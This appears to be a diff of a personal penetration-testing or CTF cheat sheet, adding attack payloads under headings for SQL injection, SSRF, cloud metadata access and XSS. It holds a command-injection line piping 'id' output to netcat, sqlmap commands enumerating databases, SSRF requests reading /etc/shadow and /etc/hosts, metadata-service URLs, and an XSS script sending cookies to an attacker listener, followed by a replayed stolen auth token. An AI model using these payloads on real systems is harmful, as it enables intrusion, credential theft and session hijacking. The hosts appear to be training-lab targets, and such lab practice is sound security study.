@@ -21,16 +21,34 @@ nc 10.10.10.1 41795
 ping $(echo "$(id)" | /system/xbin/nc 192.168.1.1 8080) 
 
 ## SQL injection
+% = * 
+
+' or '1'='1
+
+### SQLMAP 
+sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin"
+sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" --dbs
+sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" -D web_app --tables
 
 ## SSRF and IMDS
+### SSRF 
+GET  /user?profile=file:///etc/shadow 
+GET  /user?profile=https://server2/me.jpg 
+curl -v "http://login.falsimentis.com/imgget.php?logo=file:///etc/hosts"
+### IMDS
+http://169.254.169.254
+http://169.254.169.254/latest/user-data
+
+### SSRF IDMS Attack
 
 ## XSS 
 ### CookieStealer
 try with hello <hr> <hr> <hr> 
-use cookiecutter
+use cookiecutter 
 	php -S 0.0.0.0:2222
 <script>document.location='http://10.10.75.1:2222/?'+document.cookie;</script>
 jq "." cookies.log
 curl -b authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb "http://www.rookaviary.com/admin.php"
+#### USE TUN0 for COOKIE STEALING IN CTF 
 ### Or Via Browser in Console 
 	document.cookie="authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb"
